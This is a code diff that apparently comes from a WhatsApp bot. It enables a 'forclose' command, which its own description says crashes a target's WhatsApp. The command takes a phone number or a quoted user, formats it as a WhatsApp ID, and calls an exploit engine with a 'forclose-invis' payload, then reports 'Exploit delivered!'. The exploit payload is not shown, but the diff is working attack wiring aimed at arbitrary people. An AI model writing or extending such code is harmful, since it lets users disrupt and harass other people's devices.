@@ -753,12 +753,44 @@ registerCommand({
 // ═══════════════════════════════════════════════════════════
 registerCommand({
     name: "forclose",
-    aliases: ["fc"],
-    description: "Forclose exploit (Owner only)",
+    aliases: ["fc", "forclose-invis"],
+    description: "Forclose exploit - crashes target's WhatsApp",
     category: "danger",
     ownerOnly: true,
-    execute: async ({ reply }) => {
-        await reply("⚠️ Hold mate, this feature is currently disabled.\n\n_Contact the creator for access to BETA exploits._");
+    execute: async ({ sock, msg, args, reply }) => {
+        const jid = msg.key.remoteJid!;
+
+        // Get target from args or quoted message
+        let target = args[0];
+        const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;
+
+        if (!target && quotedParticipant) {
+            target = quotedParticipant;
+        } else if (target) {
+            // Clean phone number
+            target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+        }
+
+        if (!target) {
+            return reply("❌ Provide target number or reply to someone\n\nUsage: .forclose 254712345678");
+        }
+
+        try {
+            await reply(`☠️ *FORCLOSE INITIATED*\n\n🎯 Target: ${target.split('@')[0]}\n⏳ Deploying exploit...`);
+
+            // Import and execute exploit
+            const { executeExploit } = await import("../exploit-engine");
+            const result = await executeExploit(sock, "forclose-invis", target);
+
+            if (result) {
+                await reply(`✅ *FORCLOSE COMPLETED*\n\n🎯 Target: ${target.split('@')[0]}\n💀 Exploit delivered!`);
+            } else {
+                await reply(`⚠️ Execution completed with warnings. Check target status.`);
+            }
+        } catch (error: any) {
+            console.error("[FORCLOSE] Error:", error);
+            await reply(`❌ Exploit failed: ${error.message || 'Unknown error'}`);
+        }
     }
 });
 
